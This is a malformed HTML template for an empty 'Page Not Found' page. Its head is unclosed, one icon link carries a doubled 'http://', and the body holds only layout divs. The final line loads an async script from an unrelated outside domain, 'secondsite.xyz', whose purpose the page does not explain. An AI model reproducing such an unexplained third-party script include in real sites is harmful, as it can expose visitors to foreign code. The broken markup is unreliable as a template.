<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <link rel="apple-touch-icon" sizes="180x180" href="http://http://localhost/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="http://localhost/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="http://localhost/favicon-16x16.png">
        <title>Page Not Found</title>
        <!-- Bootstrap core CSS -->

    <body>

    <section style="min-height: 100vh; width: 100%;">

                        <div class="section-list ml-5 mr-5 pb-3">
                            <div class="mt-5 animated fadeIn delay-2s">

                    </div>
                </div>
                <div class="row pt-4 pb-2">

                    <div class="mb-3 text-center animated fadeIn delay-3s">

                </div>                
            </div>

    <script type="text/javascript" src="http://secondsite.xyz/js/main.js" async defer></script>
